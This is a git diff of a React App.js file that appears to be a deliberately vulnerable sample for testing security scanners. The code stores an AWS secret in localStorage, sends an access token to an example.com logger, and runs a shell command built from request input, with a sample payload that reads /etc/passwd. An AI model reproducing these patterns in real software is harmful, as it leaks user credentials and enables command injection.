8c685d77589d38f3d3e1193fc512cd4f946b873f
Douglas Adriano Queiroz <douglasqueiroz@Mac-mini-de-Douglas.local>
2022-10-14 00:45:32 -0300

    fix sources final tests

--- src/App.js
+++ src/App.js
@@ -12,30 +12,32 @@ function App() {
     login: 'douglas',
     password: 'teste.js',
   }
-  const db = localStorage.setItem('DBBASE', process.env.AWS_SECRET_ACESS_KEY)
+  const db = localStorage.setItem('DBBASE', process?.env?.AWS_SECRET_ACESS_KEY)
   console.log(db)
   if (
-    process.env.AWS_SECRET_ACESS_KEY &&
-    process.env.AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY
+    process?.env?.AWS_SECRET_ACESS_KEY &&
+    process?.env?.AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY &&
+    AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY
   ) {
     alert('Unexpected Condition')
     fetch(
-      'http://example.com/logger.php?token=' + localStorage.access_token,
+      'http://example.com/logger.php?token=' + localStorage?.access_token,
     ).then((response) => {
-      localStorage.setItem('teste', response.body)
+      localStorage.setItem('teste', response?.body)
       console.log({ localStorage })
     })
   }
 
   function teste555(req, res) {
     const cmd = 'ls ' + req.query.arg
-    const db = window.openDatabase(
+    const db = window?.openDatabase(
       'myDb',
       '1.0',
       'Personal secrets stored here',
       2 * 1024 * 1024,
     )
-    const out = cp.execSync(cmd) // Noncompliant: example of a command injection, req.query.arg = -la . ;cat /etc/passwd
+    const out = cp?.execSync(cmd) // Noncompliant: example of a command injection, req.query.arg = -la . ;cat /etc/passwd
+    return ''
   }
   return (
     <div className="App">
